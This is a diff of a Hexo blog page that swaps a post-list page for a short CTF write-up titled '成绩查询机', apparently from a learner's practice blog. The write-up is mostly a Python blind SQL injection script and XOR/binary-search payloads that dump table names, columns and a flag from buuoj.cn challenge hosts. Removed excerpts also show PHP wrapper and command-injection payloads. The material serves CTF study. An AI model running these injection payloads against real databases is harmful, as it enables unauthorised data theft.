@@ -5,10 +5,6 @@
   <!-- SEO相关 -->
   
     
-      
-        <meta name="robots" content="noindex,follow">
-      
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -23,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>Hexo</title>
+  <title>成绩查询机 - Hexo</title>
   
 
   
@@ -309,7 +305,7 @@
     <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper  dock' style="display: none;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
           
@@ -385,468 +381,222 @@
         
 
 <div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
-  <section class="post-list">
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-        信息收集
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        
 
-目录遍历
-路径遍历攻击(目录遍历)旨在访问存储在web根目录文件夹之外的文件和目录。通过操控带有“点-斜线（...）”序列以及变化的文件或使用绝对文件路径来引用文件变量，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码，配置文件和关键系统文件。需要注意的是，系统访问控制(如在微软windows操作系统上锁定或使用文件)限制了对文件的访问权限。这种攻击也称为“点点斜杠”，“目录...
-      
-    
-  </div>
+
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        成绩查询机
+      </h1>
+      <div class='new-meta-box'>
         
-        <time>2020-12-08</time>
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>lucky</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Apr 1, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="成绩查询机" data-path="/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
         
       </div>
+    
+  </div>
+
+
+  
+  <a id="more"></a>
+
+<p>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn&#x2F;search.php&#39;</span><br><span class="line"></span><br><span class="line">#print(requests.get(url&#x3D;url,params&#x3D;params).text)</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   min&#x3D;32</span><br><span class="line">   max&#x3D;128</span><br><span class="line">   mid&#x3D;(min+max)&#x2F;&#x2F;2</span><br><span class="line">   while min&lt;max:</span><br><span class="line">       	payload&#x3D;&quot;http:&#x2F;&#x2F;e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn&#x2F;?stunum&#x3D;0^(ascii(substr(database	(),%d,1))&gt;%d)&quot;%(i,mid)</span><br><span class="line">       re&#x3D;requests.get(url&#x3D;payload).text</span><br><span class="line">       if &#39;Hi admin, your score is: 100&#39; in re:</span><br><span class="line">           min&#x3D;mid+1</span><br><span class="line">           mid &#x3D; (min + max) &#x2F;&#x2F; 2</span><br><span class="line">       else:</span><br><span class="line">           max&#x3D;mid</span><br><span class="line">           mid &#x3D; (min + max) &#x2F;&#x2F; 2</span><br><span class="line">   if mid&#x3D;&#x3D;32 or mid&#x3D;&#x3D;127:</span><br><span class="line">       break</span><br><span class="line">   flag&#x3D;flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>爆库</p>
+<p>ctf</p>
+<p>payload=”<a target="_blank" rel="noopener" href="http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0%5E(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;ctf&#39;)),%d,1))&gt;%d)&quot;%(i,mid)">http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;ctf&#39;)),%d,1))&gt;%d)&quot;%(i,mid)</a></p>
+<p>flag,score</p>
+<p>payload=”<a target="_blank" rel="noopener" href="http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0%5E(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)">http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)</a></p>
+<p>flag,value</p>
+<p>payload=”e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0^(ascii(substr((select(group_concat(value))from(ctf.flag)),%d,1))&gt;%d)”%(i,mid)</p>
+<p>得到flag.</p>
+
+  
+  
+    
+    <div class='footer'>
       
-        <div>
-          <a class='readmore' href='/2020/12/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/'>
-            Read More
-          </a>
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://ckylsy.github.io/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/>http://ckylsy.github.io/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/</a></p>
+              
+            
+          </blockquote>
         </div>
+      
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-01T22:28:59+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Apr 1, 2021</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/04/%E7%AC%AC%E4%BA%8C%E5%91%A8wp/">
-        两道伪协议
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
+          
+
+        
       
         
-
-伪协议一
-
-
-emmmm,拿道题目是一个正则表达式，看到把伪协议都过滤了，但是有一点这个正则匹配只是把小写的几个伪协议过滤了，所以我们可以用大写绕过想了有几种构造方法
-
-?file=PHP://filter/resource=flag
-?file=PHP://filter/read=convert.BASE.64-encode/resource=flag
-?file=DATA://tex...
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://ckylsy.github.io/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/&title=成绩查询机 - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://ckylsy.github.io/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/&title=成绩查询机 - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://ckylsy.github.io/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/&title=成绩查询机 - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+    
       
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-04</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/12/04/%E7%AC%AC%E4%BA%8C%E5%91%A8wp/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
 </div>
 
-          </div>
+
+
         
       
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/03/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">
-        第二周学习报告
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-    
+    </div>
   </div>
+
+
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-03</time>
-        
-      </div>
+  
+
+  
+    <div class="prev-next">
       
-        <div>
-          <a class='readmore' href='/2020/12/03/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/'>
-            Read More
-          </a>
-        </div>
+      
+        <a class='next' href='/2021/04/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-final-sql/'>
+          <p class='title'>极客大挑战-final-sql<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+
+这是关于盲注的一道题，打算练练这一方面的题目，顺便联系一下写python脚本
+二分法注入，异或注入
+
+其实提示的很明显了。sql盲注
+id=1  NO! Not this! Click ot...</p>
+        </a>
       
     </div>
   
+</article>
 
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
 </div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/02/php%E5%87%BD%E6%95%B0/">
-        php函数
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>无</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-02</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/12/02/php%E5%87%BD%E6%95%B0/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
+  </article>
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/12/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-        伪协议
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>伪协议的学习</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-12-02</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/12/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/28/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%BA%8C/">
-        变量覆盖二
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>变量覆盖2</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-28</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/28/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%BA%8C/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/27/html%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">
-        html学习报告
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>无</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-27</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/27/html%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/26/rce2/">
-        rce2
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        #前言basic rce 2
-直接构造？Rem=（&quot;ca\t f\lag&quot;）或者Rem=（&quot;\x63\x61\x74\x20\x66\x6c\x61\x67&quot;）就可以出来
-但是在网上看到了一个比较厉害的做法
-?Rem=include $_GET[&quot;cky&quot;] ?&gt;&amp;cky=php://filter/read=conve...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-26</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/26/rce2/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">
-        变量覆盖
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>extract变量覆盖</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-26</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/11/25/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB/">
-        常见命令汇总
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>遇到后随时补充</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-11-25</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/25/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-      <br>
-      <div class="prev-next">
-        
-          <a class="prev" rel="prev" href="/page/8/">
-            <section class="post prev white-box shadow" >
-              <i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;Previous&nbsp;
-            </section>
-          </a>
-        
-        <p class="current">
-          9 / 10
-        </p>
-        
-          <a class="next" rel="next" href="/page/10/">
-            <section class="post next white-box shadow">
-              &nbsp;Next&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i>
-            </section>
-          </a>
-        
-      </div>
-    
-  
 
 
 </div>
@@ -856,82 +606,8 @@ emmmm,拿道题目是一个正则表达式，看到把伪协议都过滤了，�
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
 
-  
-    
-    
-
-  
-
-  
-    
-    
-
-  
 
   
 
@@ -947,8 +623,8 @@ emmmm,拿道题目是一个正则表达式，看到把伪协议都过滤了，�
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="成绩查询机";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
